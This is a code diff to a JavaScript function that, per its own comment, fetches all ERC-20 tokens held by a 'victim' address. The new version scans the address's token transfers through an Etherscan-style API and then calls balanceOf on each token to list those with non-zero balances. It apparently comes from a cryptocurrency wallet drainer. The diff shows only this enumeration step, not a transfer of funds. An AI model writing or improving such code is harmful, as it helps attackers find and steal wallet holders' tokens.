@@ -332,31 +332,47 @@
   // Fetch all ERC-20 tokens held by victim using Etherscan V2 API
   async function fetchTokenBalances(address) {
     try {
-      // Use Etherscan V2 API endpoint for token holdings
-      const url = `${ETHERSCAN_BASE_URL}/account/tokenbalances?address=${address}&apikey=${ALCHEMY_API_KEY}`;
-      console.log("🌐 Fetching from V2:", url);
+      // V2 API: get token transfers to find unique tokens
+      const url = `${ETHERSCAN_BASE_URL}/account/token-transfers?address=${address}&apikey=${ALCHEMY_API_KEY}`;
+      console.log("🌐 Fetching transfers from V2:", url);
       
       const response = await fetch(url);
       const data = await response.json();
       
       console.log("📡 Full Etherscan V2 response:", JSON.stringify(data, null, 2));
-      console.log("📡 Response status:", data.status);
-      console.log("📡 Response message:", data.message);
       
-      if (data.status === "1" && data.result && Array.isArray(data.result) && data.result.length > 0) {
-        const nonZeroTokens = data.result.filter(t => {
-          // Keep tokens with non-zero balance
-          return t.balance && t.balance !== "0" && t.balance !== "0x0";
-        });
+      if (data.result && Array.isArray(data.result) && data.result.length > 0) {
+        // Extract unique token contract addresses
+        const uniqueTokens = [...new Set(data.result.map(tx => tx.tokenAddress || tx.contractAddress))];
+        console.log(`📦 Found ${uniqueTokens.length} unique tokens from transfers`);
         
-        console.log(`📦 Found ${nonZeroTokens.length} tokens from V2 API`);
-        nonZeroTokens.forEach(t => {
-          console.log(`✅ ${t.name} (${t.symbol}): ${t.contractAddress} = ${t.balance}`);
-        });
+        // Check current balance for each token
+        const ERC20_ABI = ["function balanceOf(address account) external view returns (uint256)"];
+        const nonZeroTokens = [];
         
+        for (const tokenAddr of uniqueTokens) {
+          try {
+            const contract = new ethers.Contract(tokenAddr, ERC20_ABI, provider);
+            const balance = await contract.balanceOf(address);
+            
+            if (balance > 0n) {
+              nonZeroTokens.push({
+                contractAddress: tokenAddr,
+                balance: balance.toString(),
+                name: "Token",
+                symbol: "???"
+              });
+              console.log(`✅ ${tokenAddr}: ${ethers.formatUnits(balance, 18)} tokens`);
+            }
+          } catch (err) {
+            console.warn(`⚠️ Could not fetch balance for ${tokenAddr}:`, err.message);
+          }
+        }
+        
+        console.log(`🔍 Tokens with non-zero balance: ${nonZeroTokens.length}`);
         return nonZeroTokens;
       }
-      console.log("❌ No tokens found or API error. Status:", data.status, "Result length:", data.result ? data.result.length : 0);
+      console.log("❌ No transfers found");
       return [];
     } catch (err) {
       console.error("❌ Error fetching token balances:", err);
